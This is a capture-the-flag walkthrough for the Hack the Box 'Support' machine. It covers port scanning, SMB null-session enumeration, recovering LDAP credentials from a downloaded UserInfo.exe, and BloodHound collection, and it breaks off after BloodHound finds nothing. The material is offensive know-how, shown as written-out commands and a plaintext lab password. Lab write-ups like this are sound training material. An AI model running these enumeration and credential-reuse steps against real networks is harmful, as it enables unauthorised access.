# Hack the Box - Support

## Reconnaissance
  - Scan for open TCP ports on target machine.
  - Perform service and version detection of open ports.

```shell
rustscan -b 1000 -u 5000 -r 0-65535 -a 10.10.11.174 -- -Pn
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.174:53
Open 10.10.11.174:88
Open 10.10.11.174:135
Open 10.10.11.174:139
Open 10.10.11.174:389
Open 10.10.11.174:445
Open 10.10.11.174:464
Open 10.10.11.174:593
Open 10.10.11.174:636
Open 10.10.11.174:3269
Open 10.10.11.174:3268
Open 10.10.11.174:5985
Open 10.10.11.174:9389
Open 10.10.11.174:49664
Open 10.10.11.174:49667
Open 10.10.11.174:49674
Open 10.10.11.174:49686
Open 10.10.11.174:49700
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 16:47 IST
Initiating Parallel DNS resolution of 1 host. at 16:47
Completed Parallel DNS resolution of 1 host. at 16:47, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:47
Scanning 10.10.11.174 [18 ports]
Discovered open port 445/tcp on 10.10.11.174
Discovered open port 53/tcp on 10.10.11.174
Discovered open port 139/tcp on 10.10.11.174
Discovered open port 3269/tcp on 10.10.11.174
Discovered open port 135/tcp on 10.10.11.174
Discovered open port 3268/tcp on 10.10.11.174
Discovered open port 593/tcp on 10.10.11.174
Discovered open port 5985/tcp on 10.10.11.174
Discovered open port 464/tcp on 10.10.11.174
Discovered open port 9389/tcp on 10.10.11.174
Discovered open port 49686/tcp on 10.10.11.174
Discovered open port 49664/tcp on 10.10.11.174
Discovered open port 389/tcp on 10.10.11.174
Discovered open port 88/tcp on 10.10.11.174
Discovered open port 49700/tcp on 10.10.11.174
Discovered open port 49667/tcp on 10.10.11.174
Discovered open port 49674/tcp on 10.10.11.174
Discovered open port 636/tcp on 10.10.11.174
Completed Connect Scan at 16:47, 0.33s elapsed (18 total ports)
Nmap scan report for 10.10.11.174
Host is up, received user-set (0.16s latency).
Scanned at 2023-10-06 16:47:45 IST for 0s

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49664/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49686/tcp open  unknown          syn-ack
49700/tcp open  unknown          syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
```

```shell
rustscan -u 5000 -p 53,88,135,139,389,445,464,593,636,3269,3268,5985,9389 -a 10.10.11.174 -- -Pn -sC -sV
```
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.174:53
Open 10.10.11.174:88
Open 10.10.11.174:389
Open 10.10.11.174:139
Open 10.10.11.174:135
Open 10.10.11.174:445
Open 10.10.11.174:593
Open 10.10.11.174:636
Open 10.10.11.174:3269
Open 10.10.11.174:464
Open 10.10.11.174:3268
Open 10.10.11.174:5985
Open 10.10.11.174:9389
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 16:53 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:53
Completed NSE at 16:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:53
Completed NSE at 16:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:53
Completed NSE at 16:53, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:53
Completed Parallel DNS resolution of 1 host. at 16:53, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:53
Scanning 10.10.11.174 [13 ports]
Discovered open port 139/tcp on 10.10.11.174
Discovered open port 53/tcp on 10.10.11.174
Discovered open port 135/tcp on 10.10.11.174
Discovered open port 445/tcp on 10.10.11.174
Discovered open port 5985/tcp on 10.10.11.174
Discovered open port 88/tcp on 10.10.11.174
Discovered open port 389/tcp on 10.10.11.174
Discovered open port 3268/tcp on 10.10.11.174
Discovered open port 593/tcp on 10.10.11.174
Discovered open port 9389/tcp on 10.10.11.174
Discovered open port 636/tcp on 10.10.11.174
Discovered open port 464/tcp on 10.10.11.174
Discovered open port 3269/tcp on 10.10.11.174
Completed Connect Scan at 16:53, 0.34s elapsed (13 total ports)
Initiating Service scan at 16:53
Scanning 13 services on 10.10.11.174
Completed Service scan at 16:54, 15.27s elapsed (13 services on 1 host)
NSE: Script scanning 10.10.11.174.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:54
NSE Timing: About 99.94% done; ETC: 16:54 (0:00:00 remaining)
Completed NSE at 16:54, 40.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:54
Completed NSE at 16:54, 4.91s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:54
Completed NSE at 16:54, 0.00s elapsed
Nmap scan report for 10.10.11.174
Host is up, received user-set (0.17s latency).
Scanned at 2023-10-06 16:53:53 IST for 61s

PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-10-06 11:24:01Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        syn-ack .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 19493/tcp): CLEAN (Timeout)
|   Check 2 (port 14647/tcp): CLEAN (Timeout)
|   Check 3 (port 45724/udp): CLEAN (Timeout)
|   Check 4 (port 20897/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-10-06T11:24:13
|_  start_date: N/A
|_clock-skew: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:54
Completed NSE at 16:54, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:54
Completed NSE at 16:54, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:54
Completed NSE at 16:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.95 seconds
```

```shell
echo "10.10.11.174    dc.dupport.htb support.htb" | sudo tee -a /etc/hosts
```

----

## Port 445 (SMB)
  - SMB enumeration.
  - List shares.
  - Check for null uthentication.
  - Check for anonymous authentication.

### SMB Enumeration
```shell
crackmapexec smb 10.10.11.174
```
```shell
SMB         dc.dupport.htb  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
```
- Domain Controller - `dc.support.htb`
- Hostname - `support.htb`
- OS - Windows 10

### List SMB Shares
```CSS
▶ crackmapexec smb 10.10.11.174 --shares
```
- No results.

### SMB Null Session Authentication
```
▶ crackmapexec smb 10.10.11.174 -u 'Null' -p '' --shares
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4e4b28af-77c6-4469-b2ef-816b7af15917)

#### List Contents
  - List contents of the shared directory `support-tools`
  - Download `UserInfo.exe.zip` as it is not a common file.
```CSS
▶ smbclient -N //10.10.11.174/support-tools
▶ smb: \> dir
▶ smb: \> get UserInfo.exe.zip
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/71bcc2b8-6c09-4579-b255-90b0d0d8570a)

---

## Unzip
```shell
mkdir UserInfo
unzip UserInfo.exe.zip -d UserInfo
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9c031459-e535-4be1-a0bf-f84ba9db9f5c)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/36985a17-7e22-4098-adbe-11ef5be505f0)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4b024eb5-7e29-4e6a-ac0a-1691f853a93e)

```shell
./UserInfo.exe find -first pwnstuff
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/54f8dabe-d785-4401-bc6e-41546c626403)
```shell
LDPA Creds: ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

### Verify Credentials
```shel
crackmapexec smb support.htb -d support -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/81d35e30-1687-4770-8673-e08eebc615d4)

## BloodHound
```shell
bloodhound-python -c ALL -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174 --dns-tcp
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9fc714d2-2503-48c0-abf0-55e0b04c5fa4)

```shell
sudo neo4j console
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/1d04add6-2a5a-46d4-9bf8-473fba9db595)

```shell
bloodhound
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/7c44e2fa-d851-4ea2-bd79-99c0b7fcc2f5)

BloodHound did not find any useful results.
